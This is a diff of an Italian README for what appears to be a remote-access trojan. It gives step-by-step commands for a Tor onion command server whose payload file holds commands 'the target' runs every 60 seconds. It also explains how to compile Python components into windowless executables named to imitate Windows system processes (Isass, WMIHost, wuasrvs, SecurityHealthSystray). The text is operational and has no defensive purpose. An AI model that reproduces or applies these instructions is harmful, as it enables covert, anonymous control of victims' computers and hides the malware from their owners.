@@ -35,45 +35,45 @@ Creare e configurare il server Tor:
 
 #Per evitare problemi diventa root con "sudo su"
 
-# installa apache e tor
+#installa apache e tor
 sudo apt install apache2 tor
 
-# esegue ad ogni avvio in automatico
+#esegue ad ogni avvio in automatico
 sudo systemctl enable apache2
 sudo systemctl enable tor
 
-# esegue i demoni
+#esegue i demoni
 sudo systemctl start apache2
 sudo systemctl start tor
 
-# configura il server apache
+#configura il server apache
 cd /var/www/html
 sudo rm **
 sudo mkdir payloads_httpcmd
 cd payloads_httpcmd
 sudo nano default.txt (qui ci stanno i comandi che il target eseguirá ogni 60 secondi)
 
-# modifica il file torrc
+#modifica il file torrc
 sudo nano /etc/tor/torrc
 
-# Aggiungi le seguenti informazioni alla fine del file:
+#Aggiungi le seguenti informazioni alla fine del file:
 
 HiddenServiceDir /var/lib/tor/serverTHWP
 HiddenServicePort 80 127.0.0.1:80
 
-# La prima stringa "HiddenServiceDir" specifica dove tor andrà a salvare la config del server (NON METTERE DIRECTORY CUSTOM PER EVITARE PROBLEMI, LASCIALA COSÍ)
-# La seconda stringa hosta sulla porta 80
+#La prima stringa "HiddenServiceDir" specifica dove tor andrà a salvare la config del server (NON METTERE DIRECTORY CUSTOM PER EVITARE PROBLEMI, LASCIALA COSÍ)
+#La seconda stringa hosta sulla porta 80
 
-# Adesso devi riavviare Tor per rendere effettive le modifiche
+#Adesso devi riavviare Tor per rendere effettive le modifiche
 sudo systemctl restart tor
 
-# Se hai dubbi vai su: https://community.torproject.org/onion-services/setup/
-# Oppure chiedi a ChatGPT
+#Se hai dubbi vai su: https://community.torproject.org/onion-services/setup/
+#Oppure chiedi a ChatGPT
 
-# Adesso devi vedere il tuo dominio su tor, lo puoi vedere con:
+#Adesso devi vedere il tuo dominio su tor, lo puoi vedere con:
 cat /var/lib/tor/serverTHWP/hostname
 
-# Per evitare problemi diventa root con "sudo su"
+#Per evitare problemi diventa root con "sudo su"
 
 ----------------------------------------------------------------------------------------------------
 
@@ -91,8 +91,8 @@ Per compilare tutto é necessaria una macchina Windows, useremo nuitka per trasf
 2) Adesso apri il terminale e digita: pip install nuitka (Se pip non viene trovato, riavvia Windows dopo aver installato Python)
 3) Adesso digita: nuitka --onefile --windows-disable-console file.py
 
-# --onefile = unico file .exe
-# --windows-disable-console = no prompt quando viene eseguito
+#--onefile = unico file .exe
+#--windows-disable-console = no prompt quando viene eseguito
 
 4) Esegui nuitka per ogni file .py (Isass.py, WMIHost.py, wuasrvs.py)
 5) Dopo aver compilato tutti i file py devi compilare SecurityHealthSystray.bat con Bat-To-Exe-Converter (Cercalo su internet) NB: INSTALLER.BAT DEVE RIMANERE RAW, NON DEVE ESSERE COMPILATO!
